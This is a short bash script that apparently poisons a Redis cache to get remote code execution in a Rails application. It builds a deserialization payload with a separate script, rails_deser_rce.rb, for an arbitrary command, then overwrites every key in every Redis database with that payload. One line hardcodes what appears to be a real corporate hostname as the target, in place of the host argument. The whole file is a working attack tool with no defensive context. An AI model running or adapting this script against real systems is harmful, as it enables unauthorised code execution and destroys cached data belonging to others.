#!/bin/bash

host=$1
port=$2
comm=$3

if [ "$#" -ne 3 ]; then 
  echo "Usage $0 [redis-host] [redis-port] [command]"
  exit 1
fi

payload=$(./rails_deser_rce.rb -c "$comm")

echo "command: $comm"
echo payload:
echo "$payload" | xxd

dbs=$(redis-cli -h $host -p $port info | grep db | cut -c3)
for db in $dbs; do
  keys=$(redis-cli -h xchg.qualcomm.com -n $db --raw keys \*)
  for key in $keys; do
    echo -n "populating db$db '$key': "
    echo "$payload" | redis-cli -h $host -n $db --raw -x set $key
  done
done
